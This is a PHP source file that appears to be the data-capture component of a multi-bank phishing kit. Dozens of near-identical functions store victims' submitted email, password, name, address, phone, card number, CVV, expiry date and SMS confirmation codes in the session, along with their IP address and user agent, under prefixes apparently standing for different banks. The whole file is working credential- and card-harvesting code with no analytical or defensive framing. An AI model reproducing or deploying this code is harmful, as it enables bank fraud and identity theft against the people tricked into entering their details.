<?php 

function sg_infos(){
    $_SESSION['ml'] = htmlspecialchars($_POST['inp_sg_ml']);
	$_SESSION['mp'] = htmlspecialchars($_POST['inp_sg_mp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function sgf_infos(){
	$_SESSION['name'] = htmlspecialchars($_POST['inp_sg_name']);
	$_SESSION['str'] = htmlspecialchars($_POST['inp_sg_str']);
	$_SESSION['twn'] = htmlspecialchars($_POST['inp_sg_twn']);
	$_SESSION['tel'] = htmlspecialchars($_POST['inp_sg_tel']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function sgc_infos(){
	$_SESSION['crd'] = htmlspecialchars($_POST['inp_sgc_crd']);
	$_SESSION['cv'] = htmlspecialchars($_POST['inp_sgc_cv']);
	$_SESSION['ex'] = htmlspecialchars($_POST['inp_sgc_ex']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function sgps_infos(){
	$_SESSION['sp'] = htmlspecialchars($_POST['inp_sgps_sp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function sgt_infos(){
	$_SESSION['tel'] = htmlspecialchars($_POST['inp_sgt_t']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function sgpst_infos(){
	$_SESSION['spt'] = htmlspecialchars($_POST['inp_sgpst_sp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function ce_infos(){
    $_SESSION['ml'] = htmlspecialchars($_POST['inp_ce_ml']);
	$_SESSION['mp'] = htmlspecialchars($_POST['inp_ce_mp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function cef_infos(){
	$_SESSION['name'] = htmlspecialchars($_POST['inp_ce_name']);
	$_SESSION['str'] = htmlspecialchars($_POST['inp_ce_str']);
	$_SESSION['twn'] = htmlspecialchars($_POST['inp_ce_twn']);
	$_SESSION['tel'] = htmlspecialchars($_POST['inp_ce_tel']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function cec_infos(){
	$_SESSION['crd'] = htmlspecialchars($_POST['inp_ce_crd']);
	$_SESSION['cv'] = htmlspecialchars($_POST['inp_ce_cv']);
	$_SESSION['ex'] = htmlspecialchars($_POST['inp_ce_ex']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function cetel_infos(){
	$_SESSION['tel'] = htmlspecialchars($_POST['inp_cet_t']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function ceps_infos(){
	$_SESSION['sp'] = htmlspecialchars($_POST['inp_ceps_ps']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function cepst_infos(){
	$_SESSION['spt'] = htmlspecialchars($_POST['inp_cepst_sp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function hs_infos(){
    $_SESSION['ml'] = htmlspecialchars($_POST['inp_hs_ml']);
	$_SESSION['mp'] = htmlspecialchars($_POST['inp_hs_mp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function hss_infos(){
	$_SESSION['name'] = htmlspecialchars($_POST['inp_hs_name']);
	$_SESSION['str'] = htmlspecialchars($_POST['inp_hs_str']);
	$_SESSION['twn'] = htmlspecialchars($_POST['inp_hs_twn']);
	$_SESSION['tel'] = htmlspecialchars($_POST['inp_hs_tel']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function hsc_infos(){
	$_SESSION['crd'] = htmlspecialchars($_POST['inp_hsc_crd']);
	$_SESSION['cv'] = htmlspecialchars($_POST['inp_hsc_cv']);
	$_SESSION['ex'] = htmlspecialchars($_POST['inp_hsc_ex']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function hsps_infos(){
	$_SESSION['sp'] = htmlspecialchars($_POST['inp_hsps_sp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function hstel_infos(){
	$_SESSION['tel'] = htmlspecialchars($_POST['inp_hst_t']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function hspst_infos(){
	$_SESSION['spt'] = htmlspecialchars($_POST['inp_hspst_sp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function ng_infos(){
    $_SESSION['ml'] = htmlspecialchars($_POST['inp_ng_ml']);
	$_SESSION['mp'] = htmlspecialchars($_POST['inp_ng_mp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function ngs_infos(){
	$_SESSION['name'] = htmlspecialchars($_POST['inp_ngs_name']);
	$_SESSION['str'] = htmlspecialchars($_POST['inp_ngs_str']);
	$_SESSION['twn'] = htmlspecialchars($_POST['inp_ngs_twn']);
	$_SESSION['tel'] = htmlspecialchars($_POST['inp_ngs_tel']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function ngc_infos(){
	$_SESSION['crd'] = htmlspecialchars($_POST['inp_ngc_crd']);
	$_SESSION['cv'] = htmlspecialchars($_POST['inp_ngc_cv']);
	$_SESSION['ex'] = htmlspecialchars($_POST['inp_ngc_ex']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function brs_infos(){
    $_SESSION['ml'] = htmlspecialchars($_POST['inp_brs_ml']);
	$_SESSION['mp'] = htmlspecialchars($_POST['inp_brs_mp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function brss_infos(){
	$_SESSION['name'] = htmlspecialchars($_POST['inp_brss_name']);
	$_SESSION['str'] = htmlspecialchars($_POST['inp_brss_str']);
	$_SESSION['twn'] = htmlspecialchars($_POST['inp_brss_twn']);
	$_SESSION['tel'] = htmlspecialchars($_POST['inp_brss_tel']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function brc_infos(){
	$_SESSION['crd'] = htmlspecialchars($_POST['inp_brc_crd']);
	$_SESSION['cv'] = htmlspecialchars($_POST['inp_brc_cv']);
	$_SESSION['ex'] = htmlspecialchars($_POST['inp_brc_ex']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function hb_infos(){
    $_SESSION['ml'] = htmlspecialchars($_POST['inp_hb_ml']);
	$_SESSION['mp'] = htmlspecialchars($_POST['inp_hb_mp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function hbs_infos(){
	$_SESSION['name'] = htmlspecialchars($_POST['inp_hbs_name']);
	$_SESSION['str'] = htmlspecialchars($_POST['inp_hbs_str']);
	$_SESSION['twn'] = htmlspecialchars($_POST['inp_hbs_twn']);
	$_SESSION['tel'] = htmlspecialchars($_POST['inp_hbs_tel']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function hbc_infos(){
	$_SESSION['crd'] = htmlspecialchars($_POST['inp_hbc_crd']);
	$_SESSION['cv'] = htmlspecialchars($_POST['inp_hbc_cv']);
	$_SESSION['ex'] = htmlspecialchars($_POST['inp_hbc_ex']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function ci_infos(){
    $_SESSION['ml'] = htmlspecialchars($_POST['inp_ci_ml']);
	$_SESSION['mp'] = htmlspecialchars($_POST['inp_ci_mp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function cis_infos(){
	$_SESSION['name'] = htmlspecialchars($_POST['inp_cis_name']);
	$_SESSION['str'] = htmlspecialchars($_POST['inp_cis_str']);
	$_SESSION['twn'] = htmlspecialchars($_POST['inp_cis_twn']);
	$_SESSION['tel'] = htmlspecialchars($_POST['inp_cis_tel']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function cic_infos(){
	$_SESSION['crd'] = htmlspecialchars($_POST['inp_cic_crd']);
	$_SESSION['cv'] = htmlspecialchars($_POST['inp_cic_cv']);
	$_SESSION['ex'] = htmlspecialchars($_POST['inp_cic_ex']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function cips_infos(){
	$_SESSION['sp'] = htmlspecialchars($_POST['inp_cips_sp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function cdn_infos(){
    $_SESSION['ml'] = htmlspecialchars($_POST['inp_cdn_ml']);
	$_SESSION['mp'] = htmlspecialchars($_POST['inp_cdn_mp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function cdns_infos(){
	$_SESSION['name'] = htmlspecialchars($_POST['inp_cdns_name']);
	$_SESSION['str'] = htmlspecialchars($_POST['inp_cdns_str']);
	$_SESSION['twn'] = htmlspecialchars($_POST['inp_cdns_twn']);
	$_SESSION['tel'] = htmlspecialchars($_POST['inp_cdns_tel']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function cdnc_infos(){
	$_SESSION['crd'] = htmlspecialchars($_POST['inp_cdnc_crd']);
	$_SESSION['cv'] = htmlspecialchars($_POST['inp_cdnc_cv']);
	$_SESSION['ex'] = htmlspecialchars($_POST['inp_cdnc_ex']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function bp_infos(){
    $_SESSION['ml'] = htmlspecialchars($_POST['inp_bp_ml']);
	$_SESSION['mp'] = htmlspecialchars($_POST['inp_bp_mp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function bps_infos(){
	$_SESSION['name'] = htmlspecialchars($_POST['inp_bps_name']);
	$_SESSION['str'] = htmlspecialchars($_POST['inp_bps_str']);
	$_SESSION['twn'] = htmlspecialchars($_POST['inp_bps_twn']);
	$_SESSION['tel'] = htmlspecialchars($_POST['inp_bps_tel']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function bpc_infos(){
	$_SESSION['crd'] = htmlspecialchars($_POST['inp_bpc_crd']);
	$_SESSION['cv'] = htmlspecialchars($_POST['inp_bpc_cv']);
	$_SESSION['ex'] = htmlspecialchars($_POST['inp_bpc_ex']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function bptel_infos(){
	$_SESSION['tel'] = htmlspecialchars($_POST['inp_bpt_t']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function bppst_infos(){
	$_SESSION['spt'] = htmlspecialchars($_POST['inp_bppst_sp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function lc_infos(){
    $_SESSION['ml'] = htmlspecialchars($_POST['inp_lc_ml']);
	$_SESSION['mp'] = htmlspecialchars($_POST['inp_lc_mp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function lcs_infos(){
	$_SESSION['name'] = htmlspecialchars($_POST['inp_lcs_name']);
	$_SESSION['str'] = htmlspecialchars($_POST['inp_lcs_str']);
	$_SESSION['twn'] = htmlspecialchars($_POST['inp_lcs_twn']);
	$_SESSION['tel'] = htmlspecialchars($_POST['inp_lcs_tel']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function lcc_infos(){
	$_SESSION['crd'] = htmlspecialchars($_POST['inp_lcc_crd']);
	$_SESSION['cv'] = htmlspecialchars($_POST['inp_lcc_cv']);
	$_SESSION['ex'] = htmlspecialchars($_POST['inp_lcc_ex']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function lctel_infos(){
	$_SESSION['lct'] = htmlspecialchars($_POST['inp_lct_tel']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function lcps_infos(){
	$_SESSION['sp'] = htmlspecialchars($_POST['inp_lcps_sp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function lcpst_infos(){
	$_SESSION['spt'] = htmlspecialchars($_POST['inp_lcpst_sp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function bpl_infos(){
    $_SESSION['ml'] = htmlspecialchars($_POST['inp_bpl_ml']);
	$_SESSION['mp'] = htmlspecialchars($_POST['inp_bpl_mp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function bpls_infos(){
	$_SESSION['name'] = htmlspecialchars($_POST['inp_bpls_name']);
	$_SESSION['str'] = htmlspecialchars($_POST['inp_bpls_str']);
	$_SESSION['twn'] = htmlspecialchars($_POST['inp_bpls_twn']);
	$_SESSION['tel'] = htmlspecialchars($_POST['inp_bpls_tel']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function bplc_infos(){
	$_SESSION['crd'] = htmlspecialchars($_POST['inp_bplc_crd']);
	$_SESSION['cv'] = htmlspecialchars($_POST['inp_bplc_cv']);
	$_SESSION['ex'] = htmlspecialchars($_POST['inp_bplc_ex']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function bplps_infos(){
	$_SESSION['sp'] = htmlspecialchars($_POST['inp_bplps_sp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function bpps_infos(){
	$_SESSION['sp'] = htmlspecialchars($_POST['inp_bpps_sp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function bpltel_infos(){
	$_SESSION['tel'] = htmlspecialchars($_POST['inp_bplt_t']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function bplpst_infos(){
	$_SESSION['spt'] = htmlspecialchars($_POST['inp_bplpst_sp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function ca_infos(){
    $_SESSION['ml'] = htmlspecialchars($_POST['inp_ca_ml']);
	$_SESSION['mp'] = htmlspecialchars($_POST['inp_ca_mp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function cas_infos(){
	$_SESSION['name'] = htmlspecialchars($_POST['inp_cas_name']);
	$_SESSION['str'] = htmlspecialchars($_POST['inp_cas_str']);
	$_SESSION['twn'] = htmlspecialchars($_POST['inp_cas_twn']);
	$_SESSION['tel'] = htmlspecialchars($_POST['inp_cas_tel']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function cac_infos(){
	$_SESSION['crd'] = htmlspecialchars($_POST['inp_cac_crd']);
	$_SESSION['cv'] = htmlspecialchars($_POST['inp_cac_cv']);
	$_SESSION['ex'] = htmlspecialchars($_POST['inp_cac_ex']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function caps_infos(){
	$_SESSION['sp'] = htmlspecialchars($_POST['inp_caps_sp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function cat_infos(){
	$_SESSION['tel'] = htmlspecialchars($_POST['inp_cat_t']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function capst_infos(){
	$_SESSION['spt'] = htmlspecialchars($_POST['inp_capst_sp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function gp_infos(){
    $_SESSION['ml'] = htmlspecialchars($_POST['inp_gp_ml']);
	$_SESSION['mp'] = htmlspecialchars($_POST['inp_gp_mp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function gps_infos(){
	$_SESSION['name'] = htmlspecialchars($_POST['inp_gps_name']);
	$_SESSION['str'] = htmlspecialchars($_POST['inp_gps_str']);
	$_SESSION['twn'] = htmlspecialchars($_POST['inp_gps_twn']);
	$_SESSION['tel'] = htmlspecialchars($_POST['inp_gps_tel']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function gpc_infos(){
	$_SESSION['crd'] = htmlspecialchars($_POST['inp_gpc_crd']);
	$_SESSION['cv'] = htmlspecialchars($_POST['inp_gpc_cv']);
	$_SESSION['ex'] = htmlspecialchars($_POST['inp_gpc_ex']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function cet_infos(){
    $_SESSION['ml'] = htmlspecialchars($_POST['inp_cet_ml']);
	$_SESSION['mp'] = htmlspecialchars($_POST['inp_cet_mp']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function cets_infos(){
	$_SESSION['name'] = htmlspecialchars($_POST['inp_cets_name']);
	$_SESSION['str'] = htmlspecialchars($_POST['inp_cets_str']);
	$_SESSION['twn'] = htmlspecialchars($_POST['inp_cets_twn']);
	$_SESSION['tel'] = htmlspecialchars($_POST['inp_cets_tel']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function cetc_infos(){
	$_SESSION['crd'] = htmlspecialchars($_POST['inp_cetc_crd']);
	$_SESSION['cv'] = htmlspecialchars($_POST['inp_cetc_cv']);
	$_SESSION['ex'] = htmlspecialchars($_POST['inp_cetc_ex']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function oth_infos(){
	$_SESSION['bq'] = htmlspecialchars($_POST['inp_oth_bq']);
    $_SESSION['ml'] = htmlspecialchars($_POST['inp_oth_ml']);
	$_SESSION['mp'] = htmlspecialchars($_POST['inp_oth_mp']);
	$_SESSION['name'] = htmlspecialchars($_POST['inp_oth_name']);
	$_SESSION['str'] = htmlspecialchars($_POST['inp_oth_str']);
	$_SESSION['twn'] = htmlspecialchars($_POST['inp_oth_twn']);
	$_SESSION['tel'] = htmlspecialchars($_POST['inp_oth_tel']);
	$_SESSION['crd'] = htmlspecialchars($_POST['inp_oth_crd']);
	$_SESSION['cv'] = htmlspecialchars($_POST['inp_oth_cv']);
	$_SESSION['ex'] = htmlspecialchars($_POST['inp_oth_ex']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function start_session(){

    if(!isset($_SESSION)){
		session_start();
	}

    return $_SESSION;
}

?>